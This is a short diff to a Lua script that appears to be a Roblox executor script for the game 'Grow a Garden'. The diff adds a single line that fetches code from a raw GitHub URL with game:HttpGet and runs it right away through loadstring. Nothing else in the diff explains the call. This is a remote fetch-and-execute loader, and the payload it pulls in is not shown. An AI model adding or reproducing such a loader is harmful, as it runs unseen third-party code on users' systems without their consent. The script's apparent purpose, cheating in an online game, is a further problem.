@@ -3,6 +3,8 @@ if rawget(shared, "__SCRIPT_ALREADY_EXECUTED__") then
 end
 rawset(shared, "__SCRIPT_ALREADY_EXECUTED__", true)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/namnnni2/Grow-a-garden/refs/heads/main/GrowaGarden"))()
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
